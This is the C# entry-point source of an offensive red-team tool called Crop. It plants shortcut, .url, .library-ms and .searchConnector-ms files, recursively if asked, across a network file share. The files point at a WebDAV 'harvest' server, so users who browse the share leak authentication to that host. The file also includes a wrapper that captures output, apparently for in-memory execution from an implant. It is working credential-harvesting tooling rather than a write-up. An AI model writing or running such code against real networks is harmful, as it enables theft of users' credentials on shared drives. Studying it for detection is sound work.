using System;
using System.Linq;
using System.IO;
using System.Runtime.InteropServices;

namespace Crop
{
    class Program
    {
        static void ShowBanner()
        {
            Console.WriteLine(Config.banner);
            Console.WriteLine("Author: @domchell - MDSec ActiveBreach\n");
        }
        static void ShowHelp()
        {
            ShowBanner();

            Console.WriteLine("LNK File:");
            Console.WriteLine("crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]");
            Console.WriteLine("crop.exe \\\\fileserver\\Common\\ crop.lnk \\\\workstation@8888\\harvest \\\\workstation@8888\\harvest");
            Console.WriteLine("\nOther formats:");
            Console.WriteLine("Support extensions: .url, .library-ms, .searchConnector-ms");
            Console.WriteLine("crop.exe <output folder> <output filename> <WebDAV server> [options]");
            Console.WriteLine("crop.exe \\\\fileserver\\Common\\ crop.url \\\\workstation@8888\\harvest");
            Console.WriteLine("\nOptional arguments:");
            Console.WriteLine("--recurse : write the file to every sub folder of the specified path");
            Console.WriteLine("--clean : remove the file from every sub folder of the specified path");
            return;
        }
        static void ParseArgs(string[] args)
        {
            var recurse = false;
            var clean = false;
            if (args.Contains("--recurse"))
                recurse = true;
            else if (args.Contains("--clean"))
                clean = true;

            Config.targetLocation = args[0].Trim();
            Config.targetFilename = args[1].Trim();
            Config.targetPath = args[2].Trim();

            if(!Config.targetLocation.EndsWith("\\"))
                Config.targetLocation = Config.targetLocation + "\\";

            if (Config.targetFilename.EndsWith(".lnk"))
            {
                if (args.Length < 4)
                {
                    ShowHelp();
                    return;
                }
                Config.targetIcon = args[3].Trim();

                Console.WriteLine("[*] Setting LNK value: {0}", Config.targetPath);
                Console.WriteLine("[*] Icon location: {0}", Config.targetIcon);

                try
                {
                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            Console.WriteLine("[*] Writing LNK to: {0}", output);
                            Crop.CreateLNKCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                Console.WriteLine("[*] Removing file: {0}", f + Config.targetFilename);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        Console.WriteLine("[*] Writing LNK to: {0}", output);
                        Crop.CreateLNKCrop(output);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            else if (Config.targetFilename.ToLower().EndsWith(".url") || Config.targetFilename.ToLower().EndsWith(".library-ms") || Config.targetFilename.ToLower().EndsWith(".searchconnector-ms"))
            {
                Console.WriteLine("[*] Setting WebDAV value: {0}", Config.targetPath);

                try
                {

                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            Console.WriteLine("[*] Writing file to: {0}", output);
                            Crop.CreateFileCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                Console.WriteLine("[*] Removing file: {0}", f + Config.targetFilename);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        Console.WriteLine("[*] Writing file to: {0}", output);
                        Crop.CreateFileCrop(output);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
        }

[DllImport("shell32.dll", SetLastError = true)]
static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

public static string[] CommandLineToArgs(string commandLine)
{
    int argc;
    var argv = CommandLineToArgvW(commandLine, out argc);
    if (argv == IntPtr.Zero)
        throw new System.ComponentModel.Win32Exception();
    try
    {
        var args = new string[argc];
        for (var i = 0; i < args.Length; i++)
        {
            var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
            args[i] = Marshal.PtrToStringUni(p);
        }

        return args;
    }
    finally
    {
        Marshal.FreeHGlobal(argv);
    }
}

public static string Execute(string commandLine)
{
    var sw = new StringWriter();
    Console.SetOut(sw);
    Console.SetError(sw);

    try
    {
        Main(CommandLineToArgs(commandLine));
    }
    catch (Exception e)
    {
        return e.ToString();
    }

    return sw.ToString();
}

        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                ShowHelp();
                return;
            }

            ShowBanner();
            ParseArgs(args);

        }
    }
}

